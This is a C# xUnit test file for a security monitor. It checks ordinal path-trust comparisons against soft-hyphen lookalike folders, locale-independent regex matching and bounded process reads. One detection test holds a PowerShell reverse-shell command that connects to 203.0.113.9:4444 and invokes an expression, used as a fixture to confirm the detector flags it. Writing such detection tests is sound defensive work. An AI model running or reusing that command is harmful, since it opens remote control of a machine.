using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using Sentinel.Core;
using Xunit;

namespace Sentinel.Tests
{
    /// <summary>
    /// Regression guards for the flag and encoding audit: culture-sensitive path trust checks, locale-dependent regex
    /// matching, and a process read whose timeout could never fire.
    /// </summary>
    public class LocaleAndLaunchAuditTests
    {
        private const string SoftHyphen = "\u00AD";

        // ---- culture-sensitive path prefix ----

        [Fact]
        public void PlatformPremise_CultureStartsWithAcceptsALookalikeFolder()
        {
            // This is why the checks below had to become ordinal. If this ever stops being true on the supported
            // runtime, the premise has changed and the audit note should be revisited.
            string lookalike = @"c:\windows" + SoftHyphen + @"\evil.exe";
#pragma warning disable CA1310 // Deliberate: this asserts what the culture-sensitive overload does.
            bool cultureSensitive = lookalike.StartsWith(@"c:\windows\");
#pragma warning restore CA1310
            bool ordinal = lookalike.StartsWith(@"c:\windows\", StringComparison.OrdinalIgnoreCase);
            Assert.True(cultureSensitive);
            Assert.False(ordinal);
        }

        [Theory]
        [InlineData(@"C:\Windows\System32\svchost.exe", true)]
        [InlineData(@"c:\WINDOWS\system32\svchost.exe", true)]            // case still ignored, as on NTFS
        [InlineData(@"C:\Windows\evil.exe", true)]
        [InlineData(@"C:\Windows\u00AD\evil.exe", false)]
        [InlineData(@"C:\Users\Public\evil.exe", false)]
        [InlineData(@"C:\WindowsEvil\evil.exe", false)]                   // sibling that shares the prefix
        public void IsPathWithinDirectory_IsOrdinal(string path, bool expected)
        {
            string p = path.Replace(@"\u00AD", SoftHyphen);
            Assert.Equal(expected, SecurityValidation.IsPathWithinDirectory(p, @"C:\Windows"));
        }

        [Fact]
        public void IsPathWithinDirectory_RejectsLookalikeOfTheDirectoryItself()
        {
            Assert.False(SecurityValidation.IsPathWithinDirectory(@"C:\Windows" + SoftHyphen + @"\Temp\x.exe", @"C:\Windows"));
            Assert.False(SecurityValidation.IsPathWithinDirectory(@"C:\Program Files" + SoftHyphen + @"\App\x.exe", @"C:\Program Files"));
        }

        [Fact]
        public void RawDiskAccessMonitor_IsInWindowsDirectory_RejectsLookalikeFolder()
        {
            var method = typeof(RawDiskAccessMonitor).GetMethod("IsInWindowsDirectory", BindingFlags.NonPublic | BindingFlags.Static);
            Assert.NotNull(method);
            string windows = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string real = Path.Combine(windows, "System32", "svchost.exe");
            string fake = windows + SoftHyphen + @"\svchost.exe";
            Assert.True((bool)method!.Invoke(null, new object[] { real })!);
            Assert.False((bool)method.Invoke(null, new object[] { fake })!);
        }

        // ---- locale-dependent regex ----

        [Fact]
        public void IgnoreCaseWithoutCultureInvariant_FailsUnderTurkishCulture()
        {
            // Documents the hazard the 34 regex sites had: under tr-TR, 'I' and 'i' are different letters.
            var saved = Thread.CurrentThread.CurrentCulture;
            try
            {
                Thread.CurrentThread.CurrentCulture = CultureInfo.GetCultureInfo("tr-TR");
                Assert.False(Regex.IsMatch("INVOKE-EXPRESSION", "invoke-expression", RegexOptions.IgnoreCase));
                Assert.True(Regex.IsMatch("INVOKE-EXPRESSION", "invoke-expression", RegexOptions.IgnoreCase | RegexOptions.CultureInvariant));
            }
            finally { Thread.CurrentThread.CurrentCulture = saved; }
        }

        [Fact]
        public void NoSourceFile_UsesRegexIgnoreCaseWithoutCultureInvariant()
        {
            // Guard against reintroduction: every line that names RegexOptions.IgnoreCase must also name CultureInvariant.
            string root = FindSourceRoot();
            var offenders = new System.Collections.Generic.List<string>();
            foreach (string file in Directory.EnumerateFiles(root, "*.cs", SearchOption.AllDirectories))
            {
                if (file.Contains(@"\obj\") || file.Contains(@"\bin\")) continue;
                string[] lines = File.ReadAllLines(file);
                for (int i = 0; i < lines.Length; i++)
                    if (lines[i].Contains("RegexOptions.IgnoreCase") && !lines[i].Contains("CultureInvariant"))
                        offenders.Add(Path.GetFileName(file) + ":" + (i + 1));
            }
            Assert.True(offenders.Count == 0, "IgnoreCase without CultureInvariant: " + string.Join(", ", offenders));
        }

        [Fact]
        public void DetectionRegex_StillMatchesUppercaseUnderTurkishCulture()
        {
            // End to end on a real rule: the reverse-shell command detector must not depend on the machine's locale.
            var saved = Thread.CurrentThread.CurrentCulture;
            try
            {
                Thread.CurrentThread.CurrentCulture = CultureInfo.GetCultureInfo("tr-TR");
                string script = "$c=New-Object Net.Sockets.TCPClient('203.0.113.9',4444);$s=$c.GetStream();" +
                                "$b=New-Object byte[] 64;$n=$s.Read($b,0,64);$s.Write($b,0,$n);INVOKE-EXPRESSION $x";
                string command = "powershell.exe -Command \"" + script + "\"";
                Assert.True(ReverseShellRule.ContainsReverseShell(command));
            }
            finally { Thread.CurrentThread.CurrentCulture = saved; }
        }

        private static string FindSourceRoot()
        {
            string? dir = AppContext.BaseDirectory;
            while (dir != null && !Directory.Exists(Path.Combine(dir, "src", "Sentinel.Core"))) dir = Path.GetDirectoryName(dir);
            Assert.NotNull(dir);
            return Path.Combine(dir!, "src");
        }

        // ---- bounded process read ----

        [Fact]
        public void BoundedProcess_ReturnsOutputOfAFinishedProcess()
        {
            var psi = new ProcessStartInfo(Path.Combine(Environment.SystemDirectory, "cmd.exe"), "/c echo audit-ok")
            { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true };
            using var p = Process.Start(psi)!;
            Assert.Contains("audit-ok", BoundedProcess.ReadOutput(p, 10000));
            Assert.True(p.HasExited);
        }

        [Fact]
        public void BoundedProcess_TimeoutFiresOnAChildThatNeverCloses_AndKillsIt()
        {
            // ping -t never ends. The old ReadToEnd-then-WaitForExit(timeout) pattern would block here forever.
            var psi = new ProcessStartInfo(Path.Combine(Environment.SystemDirectory, "ping.exe"), "-t 127.0.0.1")
            { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true };
            using var p = Process.Start(psi)!;
            var clock = Stopwatch.StartNew();
            string output;
            try { output = BoundedProcess.ReadOutput(p, 1500); }
            finally { if (!p.HasExited) { try { p.Kill(); } catch { } } }
            clock.Stop();
            Assert.True(clock.Elapsed < TimeSpan.FromSeconds(10), "returned after " + clock.Elapsed);
            Assert.True(p.WaitForExit(5000), "the hung child was not killed");
            Assert.Contains("Pinging", output); // what arrived before the deadline is kept
        }

        [Fact]
        public void NoSourceFile_CallsStandardOutputReadToEnd()
        {
            // Every redirected read must go through BoundedProcess so its timeout is real.
            string root = FindSourceRoot();
            var offenders = new System.Collections.Generic.List<string>();
            foreach (string file in Directory.EnumerateFiles(root, "*.cs", SearchOption.AllDirectories))
            {
                if (file.Contains(@"\obj\") || file.Contains(@"\bin\") || Path.GetFileName(file) == "BoundedProcess.cs") continue;
                string[] lines = File.ReadAllLines(file);
                for (int i = 0; i < lines.Length; i++)
                    if (lines[i].Contains("StandardOutput.ReadToEnd()")) offenders.Add(Path.GetFileName(file) + ":" + (i + 1));
            }
            Assert.True(offenders.Count == 0, "unbounded stdout read: " + string.Join(", ", offenders));
        }
    }
}
